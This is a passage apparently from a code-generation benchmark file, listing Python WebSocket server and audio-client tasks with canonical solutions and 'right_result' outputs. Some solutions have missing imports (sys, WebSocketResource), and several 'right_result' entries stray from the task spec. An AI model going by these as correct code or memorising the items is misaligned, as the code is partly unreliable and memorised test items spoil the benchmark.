    "right_result": "from autobahn.twisted.websocket import WebSocketServerProtocol, WebSocketServerFactory\nfrom twisted.internet import reactor\n\nclass WebSocketServer:\n    class MyServerProtocol(WebSocketServerProtocol):\n        def onConnect(self, request):\n            print(f\"Client connecting: {request.peer}\")\n\n        def onOpen(self):\n            print(\"WebSocket connection open\")\n\n        def onMessage(self, payload, isBinary):\n            if isBinary:\n                self.sendMessage(payload, isBinary=True)\n            else:\n                self.sendMessage(payload, isBinary=False)\n\n        def onClose(self, wasClean, code, reason):\n            print(f\"WebSocket connection closed: {reason}\")\n\n    def __init__(self, host=\"127.0.0.1\", port=9000):\n        self.host = host\n        self.port = port\n        factory = WebSocketServerFactory()\n        factory.protocol = self.MyServerProtocol\n        self.factory = factory\n\n    def run(self):\n        reactor.listenTCP(self.port, self.factory, interface=self.host)\n        reactor.run()"
  },
  {
    "Task_id": 457,
    "Instruction": "Task Description: Create a WebSocket server using Autobahn and Twisted in Python that handles WebSocket connections, processes incoming messages, and supports message compression.\n\nClass Description: The WebSocketServer class implements a WebSocket server that listens for incoming connections, handles WebSocket protocol events, and supports per-message compression.\n\nAttributes:\n- host: str - The host address to bind the server to (default: \"127.0.0.1\")\n- port: int - The port number to listen on (default: 9000)\n- factory: WebSocketServerFactory - The factory instance that creates protocol instances and manages server settings\n\nMethods:\n- __init__(host: str = \"127.0.0.1\", port: int = 9000) -> None - Initializes the WebSocket server with the given host and port, sets up the factory and protocol configuration\n- run() -> None - Starts the WebSocket server by binding to the specified port and running the reactor loop\n\nNested Class Description: EchoServerProtocol is a WebSocket protocol implementation that handles connection events and message processing.\n\nMethods:\n- onConnect(request: Request) -> None - Called when a client attempts to connect (prints connection info)\n- onOpen() -> None - Called when the WebSocket connection is established (prints extensions in use)\n- onMessage(payload: bytes, isBinary: bool) -> None - Called when a message is received (echoes the message back to the client)",
    "Canonical_solution": "from twisted.internet import reactor\nfrom autobahn.twisted.websocket import WebSocketServerProtocol, WebSocketServerFactory\nfrom autobahn.websocket.compress import PerMessageDeflateOffer, PerMessageDeflateOfferAccept\n\nclass EchoServerProtocol(WebSocketServerProtocol):\n    def onConnect(self, request):\n        print(\"WebSocket connection request by {}\".format(request.peer))\n\n    def onOpen(self):\n        print(\"WebSocket extensions in use: {}\".format(self.websocket_extensions_in_use))\n\n    def onMessage(self, payload, isBinary):\n        self.sendMessage(payload, isBinary)\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketServerFactory(f\"ws://{host}:{port}\")\n        self.factory.protocol = EchoServerProtocol\n\n        def accept(offers):\n            for offer in offers:\n                if isinstance(offer, PerMessageDeflateOffer):\n                    return PerMessageDeflateOfferAccept(offer)\n\n        self.factory.setProtocolOptions(perMessageCompressionAccept=accept)\n\n    def run(self):\n        reactor.listenTCP(self.port, self.factory)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 52,
    "right_result": "from twisted.internet import reactor\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\n\n\nclass WebSocketServer:\n    class EchoServerProtocol(WebSocketServerProtocol):\n        def onConnect(self, request):\n            print(f\"Client connecting: {request.peer}\")\n\n        def onOpen(self):\n            print(\"WebSocket connection open.\")\n            if self.websocket_extensions_in_use:\n                print(f\"Extensions in use: {self.websocket_extensions_in_use}\")\n\n        def onMessage(self, payload, isBinary):\n            print(f\"Received message of length {len(payload)}\")\n            self.sendMessage(payload, isBinary)\n\n    def __init__(self, host=\"127.0.0.1\", port=9000):\n        self.host = host\n        self.port = port\n        self.factory = WebSocketServerFactory(f\"ws://{host}:{port}\")\n        self.factory.protocol = self.EchoServerProtocol\n        self.factory.setProtocolOptions(autoPingInterval=10, autoPingTimeout=5, enableCompression=True, compressionLevel=6)\n\n    def run(self):\n        reactor.listenTCP(self.port, self.factory, interface=self.host)\n        print(f\"Starting WebSocket server on ws://{self.host}:{self.port}\")\n        reactor.run()"
  },
  {
    "Task_id": 458,
    "Instruction": "Task Description: Implement a WebSocket server using Autobahn and Twisted in Python that handles incoming connections and echoes received messages back to clients.\n\nClass Description: The WebSocketServer class creates and manages a WebSocket server that listens for incoming connections, handles WebSocket protocols, and serves static files.\n\nAttributes:\n- host: str - The host address to bind the server to (default: \"127.0.0.1\")\n- port: int - The port number to listen on (default: 8080)\n- path: str - The URL path for WebSocket connections (default: \"ws\")\n- factory: WebSocketServerFactory - The factory that manages WebSocket protocol instances\n- resource: WebSocketResource - The WebSocket resource to handle WebSocket connections\n- root: File - The root filesystem resource for serving static files\n- site: Site - The Twisted web site that serves both WebSocket and static content\n\nMethods:\n- __init__(host: str = \"127.0.0.1\", port: int = 8080, path: str = \"ws\") -> None - Initializes the WebSocket server with specified host, port, and path\n- run() -> None - Starts the WebSocket server and begins listening for connections",
    "Canonical_solution": "from twisted.internet import reactor\nfrom twisted.python import log\nfrom twisted.web.server import Site\nfrom twisted.web.static import File\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\nfrom autobahn.twisted.resource import WebSocketResource\n\nclass EchoServerProtocol(WebSocketServerProtocol):\n    def onConnect(self, request):\n        print(\"WebSocket connection request: {}\".format(request))\n\n    def onMessage(self, payload, isBinary):\n        self.sendMessage(payload, isBinary)\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=8080, path=\"ws\"):\n        self.host = host\n        self.port = port\n        self.path = path\n\n        self.factory = WebSocketServerFactory(\"ws://{}:{}\".format(host, port))\n        self.factory.protocol = EchoServerProtocol\n\n        self.resource = WebSocketResource(self.factory)\n        self.root = File(\".\")\n        self.root.putChild(path.encode(), self.resource)\n        self.site = Site(self.root)\n\n    def run(self):\n        log.startLogging(sys.stdout)\n        reactor.listenTCP(self.port, self.site)\n        reactor.run()",
    "Code_level": "Class-level",
    "FSMID_for_test": 52,
    "right_result": "from twisted.internet import reactor\nfrom autobahn.twisted.websocket import WebSocketServerFactory, WebSocketServerProtocol\nfrom twisted.web.server import Site\nfrom twisted.web.static import File\n\nclass EchoWebSocket(WebSocketServerProtocol):\n    def onMessage(self, payload, isBinary):\n        self.sendMessage(payload, isBinary)\n\nclass WebSocketServer:\n    def __init__(self, host=\"127.0.0.1\", port=8080, path=\"ws\"):\n        self.host = host\n        self.port = port\n        self.path = path\n\n        self.factory = WebSocketServerFactory()\n        self.factory.protocol = EchoWebSocket\n\n        self.resource = WebSocketResource(self.factory)\n        \n        self.root = File(\".\")\n        self.root.putChild(path.encode('utf-8'), self.resource)\n\n        self.site = Site(self.root)\n\n    def run(self):\n        reactor.listenTCP(self.port, self.site, interface=self.host)\n        reactor.run()"
  },
  {
    "Task_id": 460,
    "Instruction": "Task Description: Implement a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send responses back to clients.\n\nFunction Description: The server function handles WebSocket connections asynchronously, processes incoming JSON messages, performs specified operations (echo, ask, throw), and sends back appropriate responses. The start_websocket_server function initializes and starts the WebSocket server.\n\nInput:\n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput:\n- None (The function runs indefinitely, processing messages as they arrive)\n- For each message processed, sends a JSON response back through the WebSocket connection\n\nMethods:\n- server(websocket, path) -> None - Handles incoming WebSocket connections and message processing\n- start_websocket_server() -> None - Starts the WebSocket server and runs the event loop",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "right_result": "import asyncio\nimport websockets\nimport json\nimport random\n\nasync def server(websocket, path):\n    try:\n        async for message in websocket:\n            try:\n                data = json.loads(message)\n                if 'action' not in data:\n                    await websocket.send(json.dumps({\"error\": \"Invalid request: Missing action\"}))\n                    continue\n\n                if data['action'] == 'echo':\n                    if 'value' not in data:\n                        await websocket.send(json.dumps({\"error\": \"Missing value for echo\"}))\n                    else:\n                        await websocket.send(json.dumps({\"result\": data['value']}))\n\n                elif data['action'] == 'ask':\n                    if 'question' not in data:\n                        await websocket.send(json.dumps({\"error\": \"Missing question for ask\"}))\n                    else:\n                        responses = [\"Yes\", \"No\", \"Maybe\"]\n                        reply = random.choice(responses)\n                        await websocket.send(json.dumps({\"answer\": reply}))\n\n                elif data['action'] == 'throw':\n                    if 'error' not in data:\n                        await websocket.send(json.dumps({\"error\": \"Missing error message for throw\"}))\n                    else:\n                        raise Exception(data['error'])\n\n                else:\n                    await websocket.send(json.dumps({\"error\": f\"Unknown action: {data['action']}\"}))\n\n            except json.JSONDecodeError:\n                await websocket.send(json.dumps({\"error\": \"Invalid JSON format\"}))\n            except Exception as e:\n                await websocket.send(json.dumps({\"error\": f\"Server error: {str(e)}\"}))\n    finally:\n        await websocket.close()\n\ndef start_websocket_server():\n    loop = asyncio.get_event_loop()\n    ws_server = websockets.serve(server, \"localhost\", 8765)\n    loop.run_until_complete(ws_server)\n    loop.run_forever()"
  },
  {
    "Task_id": 462,
    "Instruction": "Task Description: Implement a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send appropriate responses based on the requested function.\n\nFunction Description: The server function handles WebSocket connections, processes incoming JSON messages, and responds based on the specified function in the message. It supports three main operations: echoing back a value, prompting for user input, and throwing an error message. The server runs indefinitely, maintaining persistent connections with clients.\n\nInput: \n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput: None (The function runs indefinitely, sending responses back through the WebSocket connection)\n\nThe function processes incoming JSON messages with the following structure:\n{\n    \"function\": str - The operation to perform (\"echo\", \"ask\", or \"throw\"),\n    \"args\": list - Arguments for the specified function\n}\n\nThe function sends back JSON responses with either:\n- A \"return\" field containing the result for successful operations\n- A \"throw\" field containing error messages for failures or unknown functions",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "right_result": "import asyncio\nimport websockets\nimport json\nimport sys\n\nasync def server(websocket, path):\n    try:\n        async for message in websocket:\n            try:\n                data = json.loads(message)\n                function = data.get(\"function\")\n                args = data.get(\"args\", [])\n\n                if function == \"echo\":\n                    if len(args) != 1:\n                        await websocket.send(json.dumps({\"throw\": \"Invalid arguments for 'echo'\"}))\n                    else:\n                        await websocket.send(json.dumps({\"return\": args[0]}))\n\n                elif function == \"ask\":\n                    if len(args) != 1:\n                        await websocket.send(json.dumps({\"throw\": \"Invalid arguments for 'ask'\"}))\n                    else:\n                        prompt = args[0]\n                        await websocket.send(json.dumps({\"return\": input(prompt)}))\n\n                elif function == \"throw\":\n                    if len(args) != 1:\n                        await websocket.send(json.dumps({\"throw\": \"Invalid arguments for 'throw'\"}))\n                    else:\n                        error_msg = args[0]\n                        await websocket.send(json.dumps({\"throw\": error_msg}))\n\n                else:\n                    await websocket.send(json.dumps({\"throw\": f\"Unknown function: {function}\"}))\n\n            except json.JSONDecodeError:\n                await websocket.send(json.dumps({\"throw\": \"Invalid JSON format\"}))\n            except Exception as e:\n                await websocket.send(json.dumps({\"throw\": f\"Server error: {str(e)}\"}))\n    except websockets.exceptions.ConnectionClosed:\n        pass\n\nstart_server = websockets.serve(server, \"localhost\", 8765)\n\nasyncio.get_event_loop().run_until_complete(start_server)\nasyncio.get_event_loop().run_forever()"
  },
  {
    "Task_id": 463,
    "Instruction": "Task Description: Create a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send responses back to clients.\n\nFunction Description: The server function handles WebSocket connections, processes incoming JSON messages, performs specified operations (echo, ask, throw), and sends back appropriate responses. The start_websocket_server function initializes and runs the WebSocket server.\n\nInput:\n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput:\n- For the server function: None (continuously processes messages until connection ends)\n- For start_websocket_server function: None (runs indefinitely until interrupted)\n\nMethods:\n- server: async (websocket, path) -> None - Handles WebSocket connections and message processing\n- start_websocket_server: () -> None - Starts and runs the WebSocket server\n\nNote: The server expects JSON messages with a 'function' field (either 'echo', 'ask', or 'throw') and an 'args' array. It will respond with a modified JSON object containing either a 'return' field with the result or a 'throw' field with an error message.",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "right_result": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n    try:\n        async for message in websocket:\n            try:\n                data = json.loads(message)\n                func = data.get(\"function\")\n                args = data.get(\"args\", [])\n\n                if func == \"echo\":\n                    response = {\"return\": args}\n                elif func == \"ask\":\n                    response = {\"return\": \"The answer is 42\"}\n                elif func == \"throw\":\n                    response = {\"throw\": \"An error occurred\"}\n                else:\n                    response = {\"throw\": \"Unknown function\"}\n            except json.JSONDecodeError:\n                response = {\"throw\": \"Invalid JSON\"}\n\n            await websocket.send(json.dumps(response))\n\n    except websockets.exceptions.ConnectionClosed:\n        pass\n\ndef start_websocket_server():\n    loop = asyncio.new_event_loop()\n    asyncio.set_event_loop(loop)\n\n    start_server = websockets.serve(\n        server,\n        host=\"localhost\",\n        port=8765,\n        ping_interval=20\n    )\n\n    loop.run_until_complete(start_server)\n    loop.run_forever()"
  },
  {
    "Task_id": 464,
    "Instruction": "Task Description: Implement a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send appropriate responses based on the requested function.\n\nFunction Description: The server function handles WebSocket connections, processes incoming JSON messages, and responds based on the specified function in the message. It supports three main operations: echo (returns the first argument), ask (prompts user input for the first argument), and throw (returns an error with the first argument). Unknown functions result in an error response.\n\nInput: \n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput: None (The function runs indefinitely, sending responses back through the WebSocket connection)\n\nTask Description: Create a WebSocket server that listens on a specified host and port, handles client connections asynchronously, and processes JSON-formatted requests with different function calls.\n\nFunction Description: The start_websocket_server function initializes and starts a WebSocket server that runs indefinitely, using the server function to handle incoming connections and messages.\n\nInput: None\n\nOutput: None (The function runs the server indefinitely until interrupted)",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "right_result": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n    async for message in websocket:\n        try:\n            data = json.loads(message)\n            func = data.get(\"function\")\n            args = data.get(\"arguments\", [])\n            \n            if not isinstance(args, list) or len(args) < 1:\n                response = {\"error\": \"Invalid arguments\", \"id\": data.get(\"id\")}\n            elif func == \"echo\":\n                response = {\"result\": args[0], \"id\": data.get(\"id\")}\n            elif func == \"ask\":\n                user_input = input(f\"Enter value for {args[0]}: \")\n                response = {\"result\": user_input, \"id\": data.get(\"id\")}\n            elif func == \"throw\":\n                response = {\"error\": args[0], \"id\": data.get(\"id\")}\n            else:\n                response = {\"error\": \"Unknown function\", \"id\": data.get(\"id\")}\n                \n            await websocket.send(json.dumps(response))\n        except Exception as e:\n            error_response = {\"error\": str(e), \"id\": data.get(\"id\")}\n            await websocket.send(json.dumps(error_response))\n\nasync def start_websocket_server():\n    async with websockets.serve(server, \"localhost\", 8765):\n        await asyncio.Future()  # Run forever\n\nif __name__ == \"__main__\":\n    asyncio.run(start_websocket_server())"
  },
  {
    "Task_id": 465,
    "Instruction": "Task Description: Create a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send responses back to clients.\n\nFunction Description: The server function handles WebSocket connections, processes incoming JSON data, performs specified operations (echo, ask, throw), and sends back appropriate responses. The start_websocket_server function initializes and runs the WebSocket server.\n\nInput:\n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput:\n- None (The function runs indefinitely, maintaining the WebSocket connection and processing messages)\n\nNote: The server expects JSON messages with the following structure:\n{\n  \"function\": str (one of 'echo', 'ask', 'throw', or other),\n  \"args\": list (arguments for the specified function),\n  \"return\": any (will be populated in response),\n  \"throw\": any (will be populated in case of errors)\n}",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "right_result": "import asyncio\nimport websockets\nimport json\nimport random\n\nasync def server(websocket, path):\n    try:\n        async for message in websocket:\n            try:\n                data = json.loads(message)\n                function = data.get(\"function\")\n                args = data.get(\"args\", [])\n\n                if function == \"echo\":\n                    response = {\"return\": args}\n                elif function == \"ask\":\n                    question = args[0] if len(args) > 0 else \"\"\n                    response = {\"return\": f\"Answer to '{question}': {random.randint(1, 100)}\"}\n                elif function == \"throw\":\n                    error_message = args[0] if len(args) > 0 else \"An error occurred\"\n                    response = {\"throw\": error_message}\n                else:\n                    response = {\"throw\": f\"Unknown function: {function}\"}\n\n                await websocket.send(json.dumps(response))\n\n            except Exception as e:\n                await websocket.send(json.dumps({\"throw\": str(e)}))\n    except websockets.exceptions.ConnectionClosed:\n        pass\n\nasync def start_websocket_server():\n    async with websockets.serve(server, \"localhost\", 8765):\n        await asyncio.Future()  # Run forever\n\nif __name__ == \"__main__\":\n    asyncio.run(start_websocket_server())"
  },
  {
    "Task_id": 466,
    "Instruction": "Task Description: Implement a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send responses back to clients.\n\nFunction Description: The server function handles WebSocket connections, processes incoming JSON messages, performs specified operations (echo, ask, throw), and sends back appropriate responses. The start_websocket_server function initializes and runs the WebSocket server.\n\nInput:\n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput:\n- None (The function runs indefinitely, processing messages and sending responses through the WebSocket connection)\n\nNote: The server expects JSON messages with the following structure:\n{\n  \"function\": \"echo|ask|throw\",  // Operation to perform\n  \"args\": [...]                // Arguments for the operation\n}",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "right_result": "import asyncio\nimport websockets\nimport json\nimport random\n\nasync def server(websocket, path):\n    try:\n        async for message in websocket:\n            try:\n                data = json.loads(message)\n                function = data.get(\"function\")\n                args = data.get(\"args\", [])\n\n                if function == \"echo\":\n                    await websocket.send(json.dumps({\"result\": args}))\n                elif function == \"ask\":\n                    response = {\"result\": [random.choice([True, False])]}\n                    await websocket.send(json.dumps(response))\n                elif function == \"throw\":\n                    error_message = {\"error\": \"An intentional error occurred.\"}\n                    await websocket.send(json.dumps(error_message))\n                else:\n                    await websocket.send(json.dumps({\"error\": \"Unknown function\"}))\n            except json.JSONDecodeError:\n                await websocket.send(json.dumps({\"error\": \"Invalid JSON format\"}))\n    except websockets.exceptions.ConnectionClosed:\n        pass\n\nasync def start_websocket_server():\n    async with websockets.serve(server, \"localhost\", 8765):\n        await asyncio.Future()  # Run forever\n\nif __name__ == \"__main__\":\n    asyncio.run(start_websocket_server())"
  },
  {
    "Task_id": 467,
    "Instruction": "Task Description: Create a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send responses back to clients based on the requested function.\n\nFunction Description: The server function handles WebSocket connections, processes incoming JSON messages, performs specified operations (echo, ask, or throw), and returns appropriate responses. The start_websocket_server function initializes and starts the WebSocket server.\n\nInput:\n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput:\n- None (The function runs indefinitely, maintaining the WebSocket connection and processing messages)\n\nNote: The server expects JSON messages with the following structure:\n{\n  \"function\": str (required, specifies operation: \"echo\", \"ask\", or \"throw\"),\n  \"args\": list (arguments for the specified function)\n}\n\nThe server returns JSON responses with either:\n- A \"return\" field containing the result for successful operations\n- A \"throw\" field containing error messages for failures",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "right_result": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n    try:\n        async for message in websocket:\n            try:\n                data = json.loads(message)\n                function = data.get(\"function\")\n                args = data.get(\"args\", [])\n\n                if function == \"echo\":\n                    response = {\"return\": args}\n                elif function == \"ask\":\n                    question = args[0] if len(args) > 0 else \"\"\n                    response = {\"return\": f\"Answer to: {question}\"}\n                elif function == \"throw\":\n                    error_msg = args[0] if len(args) > 0 else \"Unknown error\"\n                    response = {\"throw\": error_msg}\n                else:\n                    response = {\"throw\": \"Invalid function specified\"}\n            except Exception as e:\n                response = {\"throw\": str(e)}\n            \n            await websocket.send(json.dumps(response))\n    except websockets.exceptions.ConnectionClosed:\n        pass\n\nasync def start_websocket_server():\n    async with websockets.serve(server, \"localhost\", 8765):\n        await asyncio.Future()  # Run forever\n\nif __name__ == \"__main__\":\n    asyncio.run(start_websocket_server())"
  },
  {
    "Task_id": 468,
    "Instruction": "Task Description: Implement a WebSocket client for bidirectional audio streaming that connects to a server, records audio when a key is pressed, streams it to the server, and plays back received audio. The client should handle connection retries and manage audio streams efficiently.\n\nClass Description: The `Device` class represents a WebSocket client for audio streaming. It handles WebSocket connection management, audio recording and playback, and keyboard input for controlling the recording state.\n\nAttributes:\n- server_url: str - The URL of the WebSocket server to connect to.\n- p: pyaudio.PyAudio - PyAudio instance for handling audio streams.\n- websocket: websockets.WebSocketClientProtocol - The WebSocket connection object.\n- recording: bool - Flag indicating whether audio is currently being recorded.\n- input_stream: pyaudio.Stream - Audio input stream for recording.\n- output_stream: pyaudio.Stream - Audio output stream for playback.\n- spinner: yaspin.Yaspin - Spinner object for visual feedback during recording.\n- play_audio: bool - Flag controlling whether received audio should be played.\n- CHUNK: int - Number of audio frames per buffer.\n- FORMAT: int - Audio sample format (paInt16).\n- CHANNELS: int - Number of audio channels (1 for mono).\n- RECORDING_RATE: int - Sample rate for recording (16000 Hz).\n- PLAYBACK_RATE: int - Sample rate for playback (24000 Hz).\n\nMethods:\n- __init__() -> None - Initializes the Device instance with default values.\n- connect_with_retry(max_retries: int = 50, retry_delay: int = 2) -> None - Attempts to connect to the WebSocket server with retry logic.\n- send_audio() -> None - Handles audio recording and streaming to the server while recording is active.\n- receive_audio() -> None - Receives audio data from the server and plays it back if enabled.\n- on_press(key: keyboard.Key) -> None - Callback for key press events (starts recording when CTRL is pressed).\n- on_release(key: keyboard.Key) -> None - Callback for key release events (stops recording when CTRL is released).\n- main() -> None - Main coroutine that manages the WebSocket connection and audio tasks.\n- start() -> None - Starts the asyncio event loop to run the main coroutine.",
    "Canonical_solution": "import asyncio\nimport websockets\nimport pyaudio\nfrom pynput import keyboard\nimport json\nfrom yaspin import yaspin\n\nclass Device:\n    def __init__(self):\n        self.server_url = \"0.0.0.0:10001\"\n        self.p = pyaudio.PyAudio()\n        self.websocket = None\n        self.recording = False\n        self.input_stream = None\n        self.output_stream = None\n        self.spinner = yaspin()\n        self.play_audio = True\n        self.CHUNK = 1024\n        self.FORMAT = pyaudio.paInt16\n        self.CHANNELS = 1\n        self.RECORDING_RATE = 16000\n        self.PLAYBACK_RATE = 24000\n\n    async def connect_with_retry(self, max_retries=50, retry_delay=2):\n        for attempt in range(max_retries):\n            try:\n                self.websocket = await websockets.connect(f\"ws://{self.server_url}\")\n                return\n            except ConnectionRefusedError:\n                if attempt % 8 == 0 and attempt != 0:\n                    print(f\"Loading...\")\n                await asyncio.sleep(retry_delay)\n        raise Exception(\"Failed to connect to the server after multiple attempts\")\n\n    async def send_audio(self):\n        self.input_stream = self.p.open(format=self.FORMAT, channels=self.CHANNELS, rate=self.RECORDING_RATE, input=True, 